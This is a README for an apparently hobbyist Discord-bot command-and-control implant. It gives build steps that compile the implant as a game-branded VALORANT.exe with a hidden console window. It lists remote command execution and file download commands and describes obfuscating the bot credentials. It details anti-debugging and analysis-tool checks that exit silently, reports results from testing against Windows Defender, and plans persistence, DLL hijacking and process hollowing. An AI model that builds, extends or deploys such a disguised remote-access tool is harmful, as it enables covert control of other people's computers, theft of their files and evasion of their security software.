# opss-terconnect

## ⚠️ Warning!!! Used for authorised testing and learning only!

Custom C2 using Python compiled with Nuitka. Discord bot-based remote command execution — execute commands, download files, and ping targets from a Discord control channel.

![iCON](images/icon.png)

---

## Build

### Generate obfuscated config

**Before building,** generate XOR-obfuscated config from your real credentials:

```bash
python token_gen.py "<bot_token>" "<channel_id>" "<admin_id>"
```

This outputs Python lines to paste into `VALORANT.py`. The token, channel ID, and admin ID are stored XOR-obfuscated — never in plaintext in the source.

### Compile

```bash
pip install -r requirements.txt
python -m nuitka --onefile --windows-console-mode=disable \
    --windows-icon-from-ico=valorant.ico VALORANT.py
move dist\VALORANT.exe ..
```

### File structure

```
opss-terconnect/
├── VALORANT.py          # Main bot (XOR-obfuscated config, anti-analysis)
├── defenses.py          # Anti-debug / anti-dump helpers
├── token_gen.py         # CLI tool: generate XOR-obfuscated config
├── requirements.txt     # nuitka, discord
├── .gitignore
├── README.md
├── images/
│   ├── icon.png
│   ├── connected.png
│   ├── ping.png
│   ├── exec.png
│   ├── download.png
│   └── pwned.png
└── valorant.ico
```

---

## Usage

```
!exec <COMPUTER_NAME> <command>
!download <COMPUTER_NAME> <file_path>
!pingall
```

---

## Security measures

### Static analysis (binary on disk)

- **XOR-obfuscated config** — token, channel ID, and admin ID are stored as XOR-obfuscated byte arrays. The plaintext never appears in the source or compiled binary. Defends against `strings`, grep, and static disassembly.
- **Regenerate per build** — use `token_gen.py` with a new XOR key for each build to change the obfuscated pattern.

### Runtime analysis (process memory / debugger)

- **Anti-debug** — `IsDebuggerPresent` and `CheckRemoteDebuggerPresent` checks at startup. If a debugger is attached, the process exits silently.
- **Anti-dump / tool detection** — process list scan for known analysis tools (ProcmDump, Process Hacker, x64dbg, Cheat Engine, WinDbg, IDA, dnSpy, etc.). If found, exits silently.
- **Best-effort memory wiping** — decoded token is held in a ctypes buffer, converted to string for discord.py, then the buffer is wiped. Reduces (but does not eliminate) the in-memory window.

### Limitations

- **Runtime memory dump:** The token must be in memory as a string for discord.py to connect. A dump taken while the process is running will find it. The XOR storage only defends static analysis of the binary on disk.
- **XOR key in source:** The XOR key and obfuscated bytes are in the repo. An analyst who reverses the decode logic can recover the values. This raises the bar for casual analysis — it is not a guarantee against a determined reverse engineer with a debugger attached from process start.
- **Anti-debug circumvention:** Debugger/tool checks can be bypassed by renaming tools, patching the binary, or dumping from a different angle.

---

## Case study

Playing around with a friend to evade Defender and analyst.

### The outcome:

- **PyInstaller** — not flagged by Defender. But easily reversed, token revealed.
- **Pyarmor** — flagged by Defender. Encrypted well, but captured in dynamic analysis. Still not good.
- **Nuitka** — not flagged by Defender, turned into C and compiled. Good sign. Static analysis failed; dynamic analysis recovered the token. **Best so far.**

---

## Cleanup

Simply end the executable in Task Manager.

---

## Roadmap

1. Add persistence
2. Custom token distribution server
3. Rotate final hash executable generation
4. Include DLL hijacking and hollowing

---

## MEET STEVE

Connected message

![Connected message](images/connected.png)

Check if alive

![Check if alive](images/ping.png)

Executed command

![Executed command](images/exec.png)

Download file

![Download file](images/download.png)

Bonus

![pwned](images/pwned.png)

My friend sent me this after recovering the token from dynamic analysis when I compiled using PyArmor.
